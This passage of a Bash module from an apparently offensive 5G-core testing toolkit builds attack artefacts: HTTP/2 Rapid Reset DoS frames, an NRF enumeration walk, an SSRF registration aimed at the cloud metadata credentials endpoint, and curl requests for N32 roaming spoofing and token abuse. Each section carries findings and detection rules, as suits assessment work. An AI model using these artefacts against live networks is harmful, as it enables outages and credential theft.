    aud=$(printf '%s' "$payload" | sed -n 's/.*"aud"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p')
    if [[ -z "$aud" ]]; then
        printf 'no_audience\tHIGH\tthe token carries no aud claim; audience confusion lets it be replayed at another NF\n'; n=$((n+1))
    elif [[ -n "$expected" && "$aud" != "$expected" ]]; then
        printf 'audience_mismatch\tHIGH\ttoken aud=%s but the service expected %s\n' "$(sbap_sanitize "$aud")" "$(sbap_sanitize "$expected")"; n=$((n+1))
    fi
    (( n == 0 )) && printf 'none\tINFO\tno alg=none and the audience matched\n'
    printf 'findings\t%d\n' "$n"
    return 0
}

sbap_plan() {
    cat <<'EOF'
status	handoff
what	querying a live SBA mesh or registering a rogue NF
hardware	a 5G SA testbed: Open5GS or free5GC on a host, optionally with srsRAN gNB and a UE
software	Open5GS (NRF/AMF/AUSF/UDM/SMF), curl or grpcurl, a TLS key for the SBI if mTLS is on
flow	1. build a discovery request here  2. send it from an authorised client  3. audit any token the NRF returns with --jwt-audit
note	registering an NF or minting tokens against a production core needs that operator's authorisation; nothing is sent by this module
EOF
}

# ── cross-service token abuse (arXiv 2509.08992) ────────────────────────
# A token minted for one NF is only safe at another if the consumer pins the
# audience and scope. This reports exactly which claim is missing.
sbap_token_pivot() {
    local tok="${1:-}" target="${2:-}"
    [[ "$tok" == *.*.* ]] || { printf 'ERROR\ta JWT is required\n' >&2; return 1; }
    [[ -n "$target" ]] || { printf 'ERROR\ttarget NF required\n' >&2; return 2; }
    local p payload aud sub iss scope
    p=$(printf '%s' "$tok" | cut -d. -f2)
    payload=$(sbap_b64url_decode "$p") || return 2
    aud=$(printf '%s' "$payload"   | sed -n 's/.*"aud"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p')
    sub=$(printf '%s' "$payload"   | sed -n 's/.*"sub"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p')
    iss=$(printf '%s' "$payload"   | sed -n 's/.*"iss"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p')
    scope=$(printf '%s' "$payload" | sed -n 's/.*"scope"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p')
    printf 'target_nf\t%s\naud\t%s\nsub\t%s\niss\t%s\nscope\t%s\n' \
        "$target" "$aud" "$sub" "$iss" "$scope"
    printf 'finding\tseverity\tdetail\n'
    local n=0
    if [[ -z "$aud" ]]; then
        printf 'no_audience\tHIGH\tno aud claim — any NF that does not pin the audience accepts this token\n'; n=$(( n + 1 ))
    elif [[ "$aud" != *"$target"* ]]; then
        printf 'audience_mismatch\tHIGH\taud=%s does not name %s — cross-service replay if the target does not enforce aud\n' \
            "$(sbap_sanitize "$aud")" "$(sbap_sanitize "$target")"; n=$(( n + 1 ))
    fi
    if [[ -n "$sub" && "$sub" != "$target" ]]; then
        printf 'subject_confusion\tMEDIUM\ttoken subject is %s; presenting it to %s relies on audience pinning\n' \
            "$(sbap_sanitize "$sub")" "$(sbap_sanitize "$target")"; n=$(( n + 1 ))
    fi
    (( n == 0 )) && printf 'none\tINFO\taudience and subject are consistent with the target NF\n'
    printf 'findings\t%d\n' "$n"
    return 0
}
sbap_scope_confusion() {
    local tok="${1:-}" expect="${2:-}"
    [[ "$tok" == *.*.* ]] || { printf 'ERROR\ta JWT is required\n' >&2; return 1; }
    [[ -n "$expect" ]] || { printf 'ERROR\texpected scope required\n' >&2; return 2; }
    local payload scope
    payload=$(sbap_b64url_decode "$(printf '%s' "$tok" | cut -d. -f2)") || return 2
    scope=$(printf '%s' "$payload" | sed -n 's/.*"scope"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p')
    printf 'expected_scope\t%s\nscope\t%s\n' "$expect" "$scope"
    if [[ -z "$scope" ]]; then
        printf 'finding\tHIGH\tno scope claim — an unconstrained token can be used far beyond its mint purpose\n'
    elif [[ " $scope " != *" $expect "* ]]; then
        printf 'finding\tHIGH\tscope "%s" does not grant "%s" — a consumer that trusts the subject rather than the scope is exploitable\n' \
            "$(sbap_sanitize "$scope")" "$(sbap_sanitize "$expect")"
    else
        printf 'finding\tINFO\tscope grants the requested operation\n'
    fi
    return 0
}

# ── HTTP/2 Rapid Reset (CVE-2023-44487) ─────────────────────────────────
# Open a stream, then RST it immediately; the server does O(streams) work for
# O(1) bytes on the wire. On the SBI this is a core-plane DoS.
sbap_rapid_reset() {
    local n="${1:-5}"
    [[ "$n" =~ ^[1-9][0-9]*$ ]] && (( n <= 1000 )) || { printf 'ERROR\tstream count 1..1000\n' >&2; return 2; }
    printf 'frame\tstream\ttype\thex\n'
    local i sid
    for (( i = 0; i < n; i++ )); do
        sid=$(( 2 * i + 1 ))
        printf 'open\t%d\tHEADERS\t%s\n' "$sid" "$(sbap_h2_build 1 4 "$sid" "")"
        printf 'reset\t%d\tRST_STREAM\t%s\n' "$sid" "$(sbap_h2_build 3 0 "$sid" "00000008")"
    done
    printf 'streams\t%d\nframes\t%d\nattack\tHTTP/2 Rapid Reset (CVE-2023-44487): open-then-RST each stream; the peer does per-stream work for one small frame each\n' \
        "$n" "$(( 2 * n ))"
}

# ── C3 — the directory maps the core ────────────────────────────────────
# nnrf-disc is the SBI's index: ask it for a type and it hands back instance
# ids, FQDNs, addresses and service versions for whatever it holds. The walk
# below is the whole catalogue, one request per type, and the subscription is
# the same map kept current by the NRF itself.
sbap_nrf_walk() {
    local host="${1:-nrf.5gc.mnc001.mcc001.3gppnetwork.org}" requester="${2:-AMF}"
    printf 'host\t%s\nrequester\t%s\n' "$(sbap_sanitize "$host")" "$(sbap_sanitize "$requester")"
    printf 'method\tGET\npath\t/nnrf-disc/v1/nf-instances\n'
    local t
    for t in AMF SMF UDM AUSF NRF PCF NSSF UDSF BSF NEF UPF CHF NWDAF; do
        printf 'walk\t%s\t%s?target-nf-type=%s&requester-nf-type=%s\n' \
            "$t" "/nnrf-disc/v1/nf-instances" "$t" "$requester"
    done
    printf 'walk_count\t13\n'
    printf 'answering\t{"nfInstances":[{"nfInstanceId":"...","nfType":"UDM","nfStatus":"REGISTERED","fqdn":"udm.5gc.mnc001.mcc001.3gppnetwork.org","ipv4Addresses":["10.60.0.12"],"nfServices":[{"serviceName":"nudm-ueau","versions":[{"apiVersionInUri":"v1","apiVersion":"1.0.0"}],"scheme":"https","nfServiceStatus":"REGISTERED","ipEndPoints":[{"ipv4Address":"10.60.0.12","port":7777,"transport":"TCP"}]}]}]}\n'
    printf 'subscription\t{"nfStatusNotificationUri":"https://%s/nnrf-nfm/v1/notifications","subscrCond":{"nfType":"UDM"},"reqNfInstanceId":"5e2b1c00-9f0a-4d33-8a77-1b9f0e6a4c11"}\n' \
        "$(sbap_sanitize "$host")"
    printf 'subscription_note\tthe subscription condition is one NF type, but nothing stops a client from subscribing thirteen times; each registration, deregistration and profile change then arrives as a push\n'
    printf 'finding\tfull_inventory\tHIGH\tone request per NF type returns instance ids, FQDNs, addresses, ports, service versions and status -- the core can be mapped without a single packet to any NF\n'
    printf 'finding\ttype_enumeration\tINFO\tthe type space is fixed and public (TS 23.501 6.2 / TS 29.510 6.1.6.3.2), so there is no guessing: thirteen requests cover it\n'
    printf 'finding\tscope_gap\tMEDIUM\tdiscovery is authorised by the SBI client identity, and a token minted for one NF type is scoped to nnrf-disc, not to one target: the widest scope in the core is the one that reads the directory\n'
    printf 'finding\tpush_inventory\tHIGH\tthe status subscription turns the map into a live feed with no further queries; deregistrations alone reveal restarts and deployments\n'
    printf 'finding\tno_rate_limit\tMEDIUM\tNRF discovery is an internal API assumed to be used by NFs; per-requester volume and the type mix are what make enumeration visible\n'
    printf 'artefact\tcurl -sS -H "Authorization: Bearer $TOKEN" https://%s/nnrf-disc/v1/nf-instances?target-nf-type=UDM&requester-nf-type=AMF\n' "$(sbap_sanitize "$host")"
    printf 'detect\talert on one requester disc by more than two NF types within a minute, on any discovery from an NF that then sends no service request, and on a requester whose token audience is NRF\n'
    printf 'verdict\tthe NRF is a read-only map of the core and the SBI gives it away at the price of one token: the control is authorisation granularity, not the API\n'
    return 0
}

# ── C8 — cloud metadata through the SBI ────────────────────────────────
# The SBI is an HTTP mesh where NFs fetch URIs that other NFs assert in their
# profiles. Nothing in the protocol says those URIs have to be in the SBI
# network: a registered profile can point a callback at the cloud metadata
# service, and whoever fetches it reads the instance credentials into a log,
# a notification body, or a trace.
sbap_imds_pivot() {
    local nf="${1:-SMF}" url="${2:-http://169.254.169.254/latest/meta-data/iam/security-credentials/}"
    case "$nf" in
        SMF|smf|AMF|amf|UDM|udm|AUSF|ausf|NRF|nrf|PCF|pcf|NSSF|nssf|UPF|upf|AF|af) ;;
        *) printf 'ERROR\tNF type must be one the SBI names (AMF, SMF, UDM, AUSF, NRF, PCF, NSSF, UPF, AF)\n' >&2; return 2 ;;
    esac
    nf=$(printf '%s' "$nf" | tr 'a-z' 'A-Z')
    printf 'nf_type\t%s\ncallback_uri\t%s\n' "$nf" "$(sbap_sanitize "$url")"
    printf 'registration\t{"nfInstanceId":"5e2b1c00-9f0a-4d33-8a77-1b9f0e6a4c11","nfType":"%s","nfStatus":"REGISTERED","fqdn":"%s.5gc.mnc001.mcc001.3gppnetwork.org","ipv4Addresses":["10.60.0.9"],"nfProfileChangesSupportInd":true,"nfServices":[{"serviceName":"n%s-gw","versions":[{"apiVersionInUri":"v1","apiVersion":"1.0.0"}],"scheme":"http","nfServiceStatus":"REGISTERED","ipEndPoints":[{"ipv4Address":"10.60.0.9","port":8080,"transport":"TCP"}],"fqdn":"%s.5gc.mnc001.mcc001.3gppnetwork.org"}]}\n' \
        "$nf" "$(printf '%s' "$nf" | tr 'A-Z' 'a-z')" "$(printf '%s' "$nf" | tr 'A-Z' 'a-z')" "$(printf '%s' "$nf" | tr 'A-Z' 'a-z')"
    printf 'subscribes\t{"nfStatusNotificationUri":"%s","subscrCond":{"nfType":"%s"},"reqNfInstanceId":"5e2b1c00-9f0a-4d33-8a77-1b9f0e6a4c11"}\n' \
        "$(sbap_sanitize "$url")" "$nf"
    printf 'fetcher\tNRF: sends the NF status notification to the URI a subscriber asserted, over the same HTTP client the SBI uses\n'
    printf 'fetcher\tUDM: posts the authentication confirmation or event notification to a callback registered in the subscription\n'
    printf 'chain\t1\tregister or subscribe with the callback pointing at link-local\n'
    printf 'chain\t2\tthe far NF fetches it server-side, from inside the core network namespace\n'
    printf 'chain\t3\tthe metadata response lands in a notification body, the NF log or a captured SBI frame\n'
    printf 'finding\tssrf_shape\tHIGH\tthe callback URI is data, and the fetcher is a privileged process in the core: this is ordinary server-side request forgery with a mesh on top\n'
    printf 'finding\tno_egress_policy\tHIGH\tnothing in TS 29.510 forbids a link-local or RFC 1918 callback; an allowlist at the NRF and an egress policy on the core namespace are operator choices\n'
    printf 'finding\timds_auth\tMEDIUM\tinstance metadata on most clouds needs no credential beyond being on the host, so a fetched URL is often a credential dump\n'
    printf 'finding\tblind_retrieval\tINFO\tthe fetcher usually does not return the body to the caller -- the leak is the side channel: timing, error text, or a notification that is logged\n'
    printf 'detect\tlog every SBI client fetch whose host is not a registered NF IP, and alert on any URI with 169.254.169.254, 100.100.100.200 or fd00:ec2::254 in it\n'
    printf 'detect_at_nrf\tthe NRF should refuse to store an nfStatusNotificationUri outside the SBI address plan; compare the registered set against the operator inventory\n'
    printf 'verdict\tSBI callbacks are an SSRF primitive with core-network privilege; the fix is an address allowlist, not a parser change\n'
    return 0
}

# ── C2 — SBA boundary bridging (N32-f) ─────────────────────────────────
# N32-f is a roaming interface: two SEPPs talk TLS, and everything a home NF
# can do for a visited NF crosses it. The question this answers is whether the
# trust boundary is per-message (a policy check at the home SEPP) or only
# per-peer (whatever makes it through the IPX).
sbap_n32_bridge() {
    local root="${1:-}" visiting="${2:-AMF}" plmn="${3:-001-01}"
    [[ -n "$root" ]] || { printf 'ERROR\thome apiRoot required, e.g. nudm-ueau.5gc.mnc001.mcc001.3gppnetwork.org\n' >&2; return 2; }
    case "$visiting" in AMF|amf|SMF|smf) ;; *) printf 'ERROR\tvisiting NF is AMF or SMF (the two the roaming contract names)\n' >&2; return 2 ;; esac
    visiting=$(printf '%s' "$visiting" | tr 'a-z' 'A-Z')
    local sepp="sepp.5gc.mnc${plmn#*-}.mcc${plmn%-*}.3gppnetwork.org"
    printf 'root\t%s\nvisiting_nf\t%s\nvisiting_plmn\t%s\nhome_sepp\t%s\n' \
        "$(sbap_sanitize "$root")" "$visiting" "$(sbap_sanitize "$plmn")" "$sepp"
    case "$visiting" in
        AMF) printf 'contract\tN8: visiting AMF reaches home UDM (nudm-ueau, nudm-uecm, nudm-sdm)\n' ;;
        SMF) printf 'contract\tN16: visiting SMF reaches home SMF (nsmf-pdusession)\n' ;;
    esac
    printf 'hop\t1\tvNF -> hSEPP: the forwarding request is built over N32-c\n'
    printf 'hop\t2\tvSEPP -> hSEPP: TLS with certificates, N32-c handshake (TS 33.501 13.1)\n'
    printf 'hop\t3\thSEPP -> home NF: the payload is delivered as if it came from the home AMF\n'
    printf 'header\t:method\tPOST\n'
    printf 'header\t:path\t%s/nudm-ueau/v1/imsi-001010000000001/security-information/generate-auth-data\n' "$(sbap_sanitize "$root")"
    printf 'header\t:authority\t%s\n' "$(sbap_sanitize "$root")"
    printf 'header\tcontent-type\tapplication/json\n'
    printf 'header\t3gpp-Sbi-Target-apiRoot\thttps://%s\n' "$(sbap_sanitize "$root")"
    printf 'finding\tdns\tINFO\thome apiRoots are public names: resolvable from any network, so discovery is not the barrier\n'
    printf 'finding\tnrf_scope\tINFO\tthe visited NRF only discovers its own PLMN — the home name has to be configured or guessed, not looked up\n'
    printf 'finding\tsepp_gate\tHIGH\tthe only per-message check is the home SEPP policy: service name outside the contract (nudm-ueau/nudm-uecm/nsmf-pdusession) must be refused there, and that is a configuration item, not a protocol guarantee\n'
    printf 'finding\tipx_trust\tMEDIUM\tthe IPX hops in the middle see the payload; unless NDS/IPX or a JOSE protection layer is deployed, the home side authenticates the vSEPP, not the visiting NF\n'
    printf 'finding\ttype_spoof\tHIGH\tN32-c is per-SEPP, not per-NF: an NF inside the visited core that talks to its own SEPP can name any visiting NF type, and the hSEPP has no identity of the individual source NF to check\n'
    printf 'artefact\tsend from the visited side:\n'
    printf 'artefact_line\tcurl -sS --http2-prior-knowledge -H "3gpp-Sbi-Target-apiRoot: https://%s" -H "content-type: application/json" --data @challenge.json https://%s/nudm-ueau/v1/imsi-001010000000001/security-information/generate-auth-data\n' \
        "$(sbap_sanitize "$root")" "$sepp"
    printf 'detect\tat the home SEPP: count service names per peer SEPP, alert on the first nudm-uecm or nudm-sdm from a visited peer, and on any NF type other than AMF/SMF\n'
    printf 'verdict\tthe boundary is administrative: what a visited network reaches is what the home SEPP policy allows, and the source NF is asserted, not proven\n'
    return 0
}

sbap_selftest() {
    local bad=0 nchk=0
    chk() {
        nchk=$(( nchk + 1 ))
        local n="$1" got="$2" want="$3"
        if [[ "$got" == "$want" ]]; then printf '%s\tPASS\n' "$n"
        else printf '%s\tFAIL want=%s got=%s\n' "$n" "$want" "$got"; bad=$(( bad + 1 )); fi
    }
    fld() { printf '%s\n' "$1" | awk -F'\t' -v k="$2" '$1==k{print $2; exit}'; }

    local d
    d=$(mktemp -d "$MOD_TMP/selftest.XXXXXX") || {
        printf 'ERROR\tmktemp failed under %s\n' "$MOD_TMP" >&2; return 1; }
    trap 'rm -rf "$d"' EXIT
    export LOOT_DIR="$d/loot" CAPTURES_DIR="$d/captures" STATE_DIR="$d/state"
    export SBAP_DIR="$d/loot/sba_pivot"
    mkdir -p "$SBAP_DIR"

    # 1. HTTP/2 frame types are the RFC 7540 §11.2 registry.
    chk h2-data    "$(sbap_h2_name 0)" "DATA"
    chk h2-headers "$(sbap_h2_name 1)" "HEADERS"
    chk h2-settings "$(sbap_h2_name 4)" "SETTINGS"
    chk h2-goaway  "$(sbap_h2_name 7)" "GOAWAY"
    chk h2-ping    "$(sbap_h2_name 6)" "PING"
    chk h2-unknown "$(sbap_h2_name 42)" "unknown"

    # 2. Frame build/parse round-trips; header is 9 octets.
    local f; f=$(sbap_h2_build 4 0 0 000300000064)
    chk h2-len "$(fld "$(sbap_h2_parse "$f")" length)" "6"
    chk h2-type "$(fld "$(sbap_h2_parse "$f")" type_name)" "SETTINGS"
    chk h2-sid "$(fld "$(sbap_h2_parse "$f")" stream_id)" "0"
    # a DATA frame on stream 1.
    local f2; f2=$(sbap_h2_build 0 1 1 deadbeef)
    chk h2-data-len "$(fld "$(sbap_h2_parse "$f2")" length)" "4"
    chk h2-data-sid "$(fld "$(sbap_h2_parse "$f2")" stream_id)" "1"
    chk h2-short "$(sbap_h2_parse 0000 >/dev/null 2>&1; echo $?)" "1"
    chk h2-badhex "$(sbap_h2_parse zz >/dev/null 2>&1; echo $?)" "2"

    # 3. SETTINGS parameters (RFC 7540 §6.5.2).
    local s; s=$(sbap_settings_parse 000300000064000400100000)
    chk set-maxstreams "$(printf '%s\n' "$s" | awk -F'\t' '$1==3{print $2}')" "MAX_CONCURRENT_STREAMS"
    chk set-maxstreams-v "$(printf '%s\n' "$s" | awk -F'\t' '$1==3{print $3}')" "100"
    chk set-initwin  "$(printf '%s\n' "$s" | awk -F'\t' '$1==4{print $2}')" "INITIAL_WINDOW_SIZE"
    chk set-initwin-v "$(printf '%s\n' "$s" | awk -F'\t' '$1==4{print $3}')" "1048576"
    chk set-bad "$(sbap_settings_parse 0003 >/dev/null 2>&1; echo $?)" "1"

    # 4. NRF discovery path (TS 29.510 §6.2.3).
    local nrf; nrf=$(sbap_nrf_discovery UDM AMF)
    chk nrf-path "$(fld "$nrf" path)" "/nnrf-disc/v1/nf-instances"
    chk nrf-query "$(fld "$nrf" query)" "target-nf-type=UDM&requester-nf-type=AMF"
    chk nrf-paths "$(sbap_nf_paths | awk -F'\t' '$1=="nausf-auth"{print $2}')" "/nausf-auth/v1/ue-authentications"

    # 5. JWT: the canonical jwt.io token is the external anchor.
    local tok="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
    local out; out=$(sbap_jwt_decode "$tok")
    chk jwt-alg    "$(fld "$out" alg)" "RS256"
    chk jwt-none   "$(fld "$out" alg_none)" "no"
    chk jwt-sub    "$([[ "$(fld "$out" payload)" == *'"sub":"1234567890"'* ]] && echo yes || echo no)" "yes"
    # build an alg=none token and confirm it is caught.
    local hdr payload none
    hdr=$(sbap_b64url_encode '{"alg":"none","typ":"JWT"}')
    payload=$(sbap_b64url_encode '{"sub":"AUSF"}')
    none="${hdr}.${payload}."
    out=$(sbap_jwt_audit "$none" NRF)
    chk jwt-none-flag "$(fld "$out" alg_none)" "CRITICAL"
    chk jwt-none-aud  "$(fld "$out" no_audience)" "HIGH"
    chk jwt-none-count "$(fld "$out" findings)" "2"
    # a well-formed token with the right audience abstains.
    local good
    good=$(sbap_b64url_encode '{"alg":"RS256","typ":"JWT"}')
    good="${good}.$(sbap_b64url_encode '{"aud":"NRF","sub":"AUSF"}').sig"
    out=$(sbap_jwt_audit "$good" NRF)
    chk jwt-good "$(fld "$out" none)" "INFO"
    chk jwt-good-count "$(fld "$out" findings)" "0"
    # wrong audience is flagged.
    out=$(sbap_jwt_audit "$good" UDM)
    chk jwt-mismatch "$(fld "$out" audience_mismatch)" "HIGH"
    chk jwt-bad "$(sbap_jwt_decode 'not.a.jwt!' >/dev/null 2>&1; echo $?)" "2"

    # 6. Cross-service token abuse: audience and scope.
    local tok_amf tok_ok
    tok_amf="$(sbap_b64url_encode '{"alg":"RS256"}').$(sbap_b64url_encode '{"sub":"AMF"}').sig"
    tok_ok="$(sbap_b64url_encode '{"alg":"RS256"}').$(sbap_b64url_encode '{"aud":"NRF","sub":"NRF"}').sig"
    out=$(sbap_token_pivot "$tok_amf" NRF)
    chk pivot-noaud "$(printf '%s\n' "$out" | awk -F'\t' '$1=="no_audience"{print $2}')" "HIGH"
    chk pivot-subj  "$(printf '%s\n' "$out" | awk -F'\t' '$1=="subject_confusion"{print $2}')" "MEDIUM"
    out=$(sbap_token_pivot "$tok_ok" NRF)
    chk pivot-ok "$(printf '%s\n' "$out" | awk -F'\t' '$1=="none"{print $2}')" "INFO"
    local tok_scope
    tok_scope="$(sbap_b64url_encode '{"alg":"RS256"}').$(sbap_b64url_encode '{"scope":"nnrf-disc"}').sig"
    chk scope-bad "$(sbap_scope_confusion "$tok_scope" nausf-auth | awk -F'\t' '$1=="finding"{print ($2=="HIGH")?"hi":"no"}')" "hi"
    chk scope-ok  "$(sbap_scope_confusion "$tok_scope" nnrf-disc | awk -F'\t' '$1=="finding"{print ($2=="INFO")?"ok":"no"}')" "ok"

    # 7. HTTP/2 Rapid Reset: n streams -> 2n frames, n of them RST_STREAM.
    out=$(sbap_rapid_reset 3)
    chk rapid-streams "$(printf '%s\n' "$out" | awk -F'\t' '$1=="streams"{print $2}')" "3"
    chk rapid-frames  "$(printf '%s\n' "$out" | awk -F'\t' '$1=="frames"{print $2}')" "6"
    chk rapid-rst     "$(printf '%s\n' "$out" | awk -F'\t' '$1=="reset"{n++} END{print n+0}')" "3"
    chk rapid-bad     "$(sbap_rapid_reset 0 >/dev/null 2>&1; echo $?)" "2"

    # 7b. C2 -- N32-f boundary: the contract is per visiting NF type, the
    # gate is one policy at the home SEPP, and the source NF is asserted.
    out=$(sbap_n32_bridge nudm-ueau.5gc.mnc001.mcc001.3gppnetwork.org AMF 001-01)
    chk n32-root     "$(fld "$out" root)"        "nudm-ueau.5gc.mnc001.mcc001.3gppnetwork.org"
    chk n32-nf       "$(fld "$out" visiting_nf)" "AMF"
    chk n32-sepp     "$(fld "$out" home_sepp)"   "sepp.5gc.mnc01.mcc001.3gppnetwork.org"
    chk n32-contract "$(fld "$out" contract | cut -c1-2)" "N8"
    chk n32-hops     "$(printf '%s\n' "$out" | awk -F'\t' '$1=="hop"{n++} END{print n+0}')" "3"
    chk n32-gate     "$(printf '%s\n' "$out" | awk -F'\t' '$1=="finding" && $2=="sepp_gate"{print $3}')" "HIGH"
    chk n32-spoof    "$(printf '%s\n' "$out" | awk -F'\t' '$1=="finding" && $2=="type_spoof"{print $3}')" "HIGH"
    chk n32-curl     "$(printf '%s\n' "$out" | awk -F'\t' '$1=="artefact_line"{print ($2 ~ /http2-prior-knowledge/)?"yes":"no"}')" "yes"
    out=$(sbap_n32_bridge nudm-uecm.5gc.mnc001.mcc001.3gppnetwork.org SMF 001-01)
    chk n32-smf      "$(fld "$out" contract | cut -c1-3)" "N16"
    chk n32-noarg    "$(sbap_n32_bridge >/dev/null 2>&1; echo $?)" "2"
    chk n32-badnf    "$(sbap_n32_bridge x UPF >/dev/null 2>&1; echo $?)" "2"

    # 7c. C8 -- the SBI callback as an SSRF primitive at core privilege.
    out=$(sbap_imds_pivot SMF)
    chk imds-nf      "$(fld "$out" nf_type)"        "SMF"
    chk imds-uri     "$(fld "$out" callback_uri)"   "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    chk imds-json    "$(fld "$out" registration | grep -c '"nfInstanceId"')" "1"
    chk imds-claims  "$(fld "$out" subscribes | grep -c '\"nfStatusNotificationUri\"')" "1"
    chk imds-shape   "$(printf '%s\n' "$out" | awk -F'\t' '$1=="finding" && $2=="ssrf_shape"{print $3}')" "HIGH"
    chk imds-egress  "$(printf '%s\n' "$out" | awk -F'\t' '$1=="finding" && $2=="no_egress_policy"{print $3}')" "HIGH"
    chk imds-chain   "$(printf '%s\n' "$out" | awk -F'\t' '$1=="chain"{n++} END{print n+0}')" "3"
    chk imds-detect  "$(printf '%s\n' "$out" | awk -F'\t' '$1=="detect"{print ($2 ~ /169.254.169.254/)?"yes":"no"}')" "yes"
    chk imds-badnf   "$(sbap_imds_pivot UPX >/dev/null 2>&1; echo $?)" "2"
    chk imds-json-ok "$(sbap_imds_pivot AMF | awk -F'\t' '$1=="registration"{print $2}' | python3 -c 'import json,sys; json.load(sys.stdin); print("ok")' 2>/dev/null)" "ok"

    # 7d. C3 -- the directory as a map of the core.
    out=$(sbap_nrf_walk nrf.5gc.mnc001.mcc001.3gppnetwork.org AMF)
    chk walk-host    "$(fld "$out" host)"  "nrf.5gc.mnc001.mcc001.3gppnetwork.org"
    chk walk-count   "$(fld "$out" walk_count)" "13"
    chk walk-types   "$(printf '%s\n' "$out" | awk -F'\t' '$1=="walk"{print $2}' | sort -u | wc -l | tr -d ' ')" "13"
    chk walk-udm     "$(printf '%s\n' "$out" | awk -F'\t' '$1=="walk" && $2=="UDM"{print ($3 ~ /target-nf-type=UDM/)?"yes":"no"}')" "yes"
    chk walk-inv     "$(printf '%s\n' "$out" | awk -F'\t' '$1=="finding" && $2=="full_inventory"{print $3}')" "HIGH"
    chk walk-push    "$(printf '%s\n' "$out" | awk -F'\t' '$1=="finding" && $2=="push_inventory"{print $3}')" "HIGH"
    chk walk-sub     "$(fld "$out" subscription | grep -c 'nfStatusNotificationUri')" "1"
    chk walk-json    "$(fld "$out" answering | python3 -c 'import json,sys; d=json.load(sys.stdin); print(len(d["nfInstances"]))' 2>/dev/null)" "1"
    chk walk-curl    "$(fld "$out" artefact | grep -c 'target-nf-type=UDM')" "1"

    # 8. HPACK (RFC 7541): the static table, the indexed and literal forms,
    # the Huffman code and the dynamic table the appendix examples exercise.
    local hp
    hp=$(sbap_hpack_decode 828684410f7777772e6578616d706c652e636f6d h)
    chk hpack-c31-method "$(fld "$hp" h.0.value)" "GET"
    chk hpack-c31-auth   "$(fld "$hp" h.3.value)" "www.example.com"
    chk hpack-c31-size   "$(fld "$hp" h.table_size)" "57"
    chk hpack-c31-count  "$(fld "$hp" h.count)" "4"
    # the indexed form alone: 82 is :method GET in the static table.
    hp=$(sbap_hpack_decode 82 h)
    chk hpack-indexed-name "$(fld "$hp" h.0.name)" ":method"
    chk hpack-indexed-value "$(fld "$hp" h.0.value)" "GET"
    # C.2.2 literal without indexing, C.2.3 never indexed.
    hp=$(sbap_hpack_decode 040c2f73616d706c652f70617468 h)
    chk hpack-c22 "$(fld "$hp" h.0.name):$(fld "$hp" h.0.value)" ":path:/sample/path"
    chk hpack-c22-dyn "$(fld "$hp" h.dynamic_entries)" "0"
    hp=$(sbap_hpack_decode 100870617373776f726406736563726574 h)
    chk hpack-c23 "$(fld "$hp" h.0.name):$(fld "$hp" h.0.value)" "password:secret"
    chk hpack-c23-dyn "$(fld "$hp" h.dynamic_entries)" "0"
    # C.4.1 the same request with the authority Huffman-coded.
    hp=$(sbap_hpack_decode 828684418cf1e3c2e5f23a6ba0ab90f4ff h)
    chk hpack-c41 "$(fld "$hp" h.3.value)" "www.example.com"
    # C.3.2 indexes the entry C.3.1 added, so the two blocks are one sequence.
    hp=$(sbap_hpack_decode_seq h 828684410f7777772e6578616d706c652e636f6d 828684be58086e6f2d6361636865)
    chk hpack-c32-index "$(fld "$hp" h.7.index)" "62"
    chk hpack-c32-auth  "$(fld "$hp" h.7.value)" "www.example.com"
    chk hpack-c32-cache "$(fld "$hp" h.8.value)" "no-cache"
    chk hpack-c32-size  "$(fld "$hp" h.table_size)" "110"
    # a dynamic table size update (C.3.3 style) and an index past the table.
    hp=$(sbap_hpack_decode 3fe11f h)
    chk hpack-size-update "$(fld "$hp" h.0.max_size)" "4096"
    chk hpack-miss "$(sbap_hpack_decode_seq h be >/dev/null 2>&1; echo $?)" "1"
    # a bad Huffman padding and a zero index are refused, not decoded.
    chk hpack-pad "$(sbap_hpack_decode_seq h 418cf1e3c2e5f23a6ba0ab90f4 >/dev/null 2>&1; echo $?)" "1"
    chk hpack-zero-index "$(sbap_hpack_decode_seq h 80 >/dev/null 2>&1; echo $?)" "1"
    chk hpack-badhex "$(sbap_hpack_decode_seq h zz >/dev/null 2>&1; echo $?)" "2"
    # a HEADERS frame hands its header block to HPACK, padding and priority
    # fields stripped first.
    hp=$(sbap_h2_parse 000014010500000001828684410f7777772e6578616d706c652e636f6d)
    chk h2-headers-block "$(fld "$hp" header.3.value)" "www.example.com"
    hp=$(sbap_h2_parse 000017010d0000000102828684410f7777772e6578616d706c652e636f6d0000)
    chk h2-padded-pad "$(fld "$hp" pad_length)" "2"
    hp=$(sbap_h2_parse 000019012500000001000000010a828684410f7777772e6578616d706c652e636f6d)
    chk h2-priority-weight "$(fld "$hp" weight)" "11"
    # RFC 7540 §6.3: weight is the octet plus one, so 0xff reads 256, not 0.
    hp=$(sbap_h2_parse 00001901250000000100000001ff828684410f7777772e6578616d706c652e636f6d)
    chk h2-priority-weight-256 "$(fld "$hp" weight)" "256"

    # The SBI socket takes no arming, and a send without framing is still
    # refused rather than guessed at: this file sends frames, it does not make
    # them.
    chk sbi-send-noframes  "$(sbap_cmd_sbi_send nrf.example 443 >/dev/null 2>&1; echo $?)" "2"
    chk sbi-send-says-why  "$(sbap_cmd_sbi_send nrf.example 2>&1 >/dev/null | grep -c 'does not make them')" "1"
    chk sbi-send-no-arming "$(grep -cE '^[[:space:]]*printf .status.{1,3}disarmed' "${BASH_SOURCE[0]}")" "0"
    chk sbi-send-tool-present "$([[ -f "$IMSISTING_ROOT/tools/stream_assoc.py" ]] && echo yes || echo no)" "yes"

    printf 'ASSERTIONS\t%d\n' "$nchk"
    printf 'RESULT\t%s\n' "$([[ $bad -eq 0 ]] && echo PASS || echo "FAIL($bad)")"
    return $(( bad > 0 ))
}

sbap_menu() {
    while true; do
        banner
        echo "  === 5G SBA Pivot ==="
        echo
        cat <<'M'
  [1]  HTTP/2 frame type reference
  [2]  Build an HTTP/2 frame
  [3]  Parse an HTTP/2 frame
  [4]  Parse a SETTINGS payload
  [5]  NRF discovery request
